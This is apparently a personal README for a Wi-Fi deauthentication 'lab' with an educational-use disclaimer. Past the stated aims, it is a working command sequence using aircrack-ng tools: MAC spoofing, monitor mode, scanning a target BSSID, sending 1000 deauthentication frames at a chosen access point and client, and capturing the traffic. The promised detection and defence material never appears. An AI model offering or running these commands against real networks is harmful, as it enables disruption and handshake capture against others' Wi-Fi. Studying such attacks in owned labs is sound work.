# Wi-Fi Deauthentication Lab (Educational Only)  

⚠️ **Disclaimer**  
This script is for **educational and research purposes only**.  
- Use it **only in your own lab environment** or with **explicit written permission**.  
- The author is **not responsible** for misuse or illegal activity.  
- Unauthorized use against third-party networks is **illegal** and may result in severe penalties.  

---

##  Purpose  
This script demonstrates how **legacy Wi-Fi protocols (WEP/WPA/WPA2)** are vulnerable to **deauthentication frame injection**, which can force clients off a network.  

The goal is **not to attack real networks**, but to:  
- Understand the **weakness** of older Wi-Fi security,  
- Learn how to **set up a lab** to safely replicate the attack,  
- Explore how to **detect** such events using Wireshark/tshark,  
- Study **defensive measures** (WPA3, 802.11w PMF).  

---

##  Requirements  
- Linux (Debian/Ubuntu/Kali recommended)  
- Root privileges  
- Wireless adapter supporting **monitor mode + packet injection**  
  (e.g., Alfa AWUS adapters)  
- Tools:  
  - `airmon-ng` / `aireplay-ng` (part of aircrack-ng suite)  
  - `tshark` / `wireshark` for detection  

---

##  Lab Workflow  
1. Set up a **test Wi-Fi network** with WPA2 (router/AP you own).  
2. Place your adapter in **monitor mode**:  
   ```bash
   sudo airmon-ng start wlan0

To test the tools on **own environment** with airmon-ng this is an ethical tool i use the command for this wifi scripting 
1. open vmware edit USB setting to allow USB 3.1
2. power on Kali linux environment on vmware
3. plug in your awus wifi adapter mine is AWUS036ACH
   4.change Mac address
ifconfig [it will show mac address mac address have 6 segment btw in format of ether : mac address]
ifconfig (your wifi adapter name mine is wlan0) down [shutdonw first]
ifconfig wlan0 hw ether (change to mac address u want eg 00:11:22:33:44:55)
ifconfig wlan0 up

 5.open monitor mode
 iwconfig [chek isit in monitor mode/managed mode]
 ifconfig wlan0 down 
 airmon-ng check kill [kill internet operation that may disrupt]
 iwconfig wlan0 mode monitor mode / is this does not work usee airmon-ng start wlan0
 ifconfig wlan0 up
 iwconfig

6.analyse the wifi
airodump-ng wlan0mon / airodump-ng --band a [for 5g] if abg[for 4g and 5g but slower ] wlan0mon
airodump-ng --bssid (target network mac address) --channel (ch) --write (file) wlan0mon
ls 

7.deauth own wifi
aireplay-ng --deauth 1000 -a (target mac ap) -c  (station mac address of client )  wlan0mon
airodump-ng --bssid (mac address) --channel (channelnom) -w capture wlan0mon
 
